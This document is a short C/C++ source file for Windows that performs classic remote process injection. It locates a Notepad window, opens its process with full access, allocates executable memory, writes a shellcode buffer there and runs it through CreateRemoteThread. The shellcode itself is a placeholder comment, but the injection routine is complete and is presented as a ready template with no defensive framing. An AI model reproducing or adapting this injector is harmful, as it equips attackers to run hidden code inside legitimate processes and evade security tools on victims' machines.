#include <stdio.h>
#include <stdlib.h>
#include <windows.h>
#include <iostream>

using namespace std;

unsigned char my_payload[] = /*shellcode_here*/

int main() {

  HANDLE rt;
  DWORD pid;
  HANDLE ph;

  HWND hw = FindWindow(NULL, (LPCSTR) "Untitled - Notepad");
  if (hw == NULL) {
    cout<<"Error: Window not found";
    return -12;
  }

  GetWindowThreadProcessId(hw, &pid);
  ph = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);

  LPVOID rb = VirtualAllocEx(ph, NULL, sizeof(my_payload), MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
  WriteProcessMemory(ph, rb, my_payload, sizeof(my_payload), NULL);

  rt = CreateRemoteThread(ph, NULL, 0, (LPTHREAD_START_ROUTINE)rb, NULL, 0, NULL);
  CloseHandle(ph);

  return 0;
}
